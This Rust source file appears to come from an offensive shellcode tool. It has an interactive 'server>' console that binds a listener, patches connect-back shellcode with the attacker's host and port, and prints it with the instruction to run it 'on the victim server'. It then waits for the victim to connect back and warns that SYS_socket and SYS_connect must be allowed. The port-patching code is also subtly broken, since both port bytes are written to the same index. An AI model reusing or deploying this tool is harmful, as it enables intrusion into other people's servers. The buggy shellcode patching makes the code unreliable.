use colored::Colorize;
use syscalls::Sysno;
use std::{error::Error, io::{self, Write}, net::TcpListener};

use crate::{config::{Config, ScFmt}, util::{print_shellcode_quoted, print_shellcode_hex, print_info}, shellcode::{SYS_READ_RECEIVER, SYS_RECVFROM_RECEIVER}};
use crate::util::{print_success, print_warning, print_error};

fn help() {
    print!("
    Core Commands
    ============= 

        Command                Description
        -------                -----------
        options                List all options
        set <option> <value>   Set option
        run                    Start server
        close                  Close server
        back                   Back to menu
");
}

fn option_help(config: &mut Config) {
    print!("
    Options
    =======

        Option        Value           Description
        ------        -----           -----------
        host          {:<16}Server host
        port          {:<16}Server port
        format        {:<16}Shellcode format
        read_syscall  {:<16}Read syscall


    Available Syscalls
    ==================

        Verb          Syscalls
        ----          --------
        read_syscall  SYS_read, SYS_recvfrom

    Shellcode Formats
    ==================

        Format        Example
        -------       -------
        quoted        \"\\xde\\xad\\xbe\\xef\"
        hex           deadbeef
", config.server_host, config.server_port, config.sc_fmt, config.read_syscall);
}

fn run(config: &mut Config) -> Result<(), Box<dyn Error>> {
    if config.connected {
        print_error("Server already connected");
        return Ok(());
    }

    let server_sock_addr = format!("{}:{}", config.server_host.to_string(), config.server_port);
    let listener = TcpListener::bind(&server_sock_addr)?;

    print_info("Run the following shellcode on the victim server:");

    let read_receiver = match config.open_syscall.sysno {
        Sysno::read => SYS_READ_RECEIVER,
        Sysno::recvfrom => SYS_RECVFROM_RECEIVER,
        _ => SYS_READ_RECEIVER,
    };
    let mut read_shellcode = read_receiver.shellcode.to_vec();
    let host_octets = config.server_host.octets();
    for i in 0..4 {
        read_shellcode[read_receiver.host_index + i] = host_octets[i];
    }
    read_shellcode[read_receiver.port_index] = (config.server_port & 0xff) as u8;
    read_shellcode[read_receiver.port_index] = ((config.server_port & 0xff00) >> 8) as u8;
    match config.sc_fmt {
        ScFmt::ScFmtQuoted => print_shellcode_quoted(&read_shellcode),
        ScFmt::ScFmtHex => print_shellcode_hex(&read_shellcode),
        _ => print_shellcode_quoted(&read_shellcode),
    }

    let waiting_connecion_msg = format!("Waiting for connection on {}", &server_sock_addr);
    print_info(&waiting_connecion_msg);

    let (client, client_addr) = listener.accept()?;
    let client_sock_addr = client_addr.to_string();
    let connection_established_msg = format!("Connection established from {}", &client_sock_addr);
    print_success(&connection_established_msg);

    Ok(())
}

pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
    let ps = "server>".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    let allowed_msg = format!("{} and {} should be allowed", "SYS_socket".bold(), "SYS_connect".bold());
    print_warning(&allowed_msg);

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{} ", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            break;
        }
        let mut iter = line.trim().split_whitespace();
        if let Some(command) = iter.next() {
            if command == "help" {
                help();
            } else if command == "options" {
                option_help(config);
            } else if command == "run" {
                run(config)?;
            }
        } else {
            help();
        }
    }
    Ok(())
}
